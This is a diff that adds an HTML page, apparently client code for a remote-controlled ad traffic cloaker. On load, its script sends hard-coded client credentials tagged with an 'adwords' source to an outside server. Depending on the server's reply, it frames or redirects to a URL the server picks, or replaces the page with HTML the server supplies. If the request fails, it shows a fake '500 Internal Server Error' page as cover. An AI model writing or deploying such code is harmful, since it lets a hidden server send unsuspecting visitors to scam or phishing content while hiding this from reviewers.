@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JavaScript Implementation</title>
+</head>
+<body>
+    <script>
+        const SERVER_URL = 'https://rbl.palladium.expert';
+
+        // Simulating a data collection function
+        function collectRequestData() {
+            return {
+                clientId: 3575,
+                clientCompany: "dcJWAeznRSUsTOKDlgsg",
+                clientSecret: "MzU3NWRjSldBZXpuUlNVc1RPS0RsZ3NnY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==",
+                bannerSource: 'adwords'
+            };
+        }
+
+        // Sending data to the server using fetch
+        async function sendRequest(data) {
+            try {
+                const response = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: new URLSearchParams(data).toString()
+                });
+
+                if (!response.ok) {
+                    throw new Error('Request failed with status ' + response.status);
+                }
+
+                const result = await response.json();
+                handleServerReply(result);
+            } catch (error) {
+                console.error('Error:', error);
+                showError();
+            }
+        }
+
+        // Handling server responses
+        function handleServerReply(reply) {
+            const { result, mode, target, content } = reply;
+
+            if (result) {
+                switch (mode) {
+                    case 1: // Display an iFrame
+                        document.body.innerHTML = `<iframe src="${target}" style="width:100%; height:100%; border:none;"></iframe>`;
+                        break;
+                    case 2: // Redirect to a URL
+                        window.location.href = target;
+                        break;
+                    case 3: // Load content dynamically
+                        console.log('Dynamic content loading not supported.');
+                        break;
+                    case 4: // Display content
+                        document.body.innerHTML = content;
+                        break;
+                    default:
+                        console.error('Unhandled mode:', mode);
+                }
+            } else {
+                console.error('Server replied with an error.');
+            }
+        }
+
+        // Show a default error message
+        function showError() {
+            document.body.innerHTML = `
+                <h1>500 Internal Server Error</h1>
+                <p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>
+            `;
+        }
+
+        // Main execution
+        const requestData = collectRequestData();
+        sendRequest(requestData);
+    </script>
+</body>
+</html>
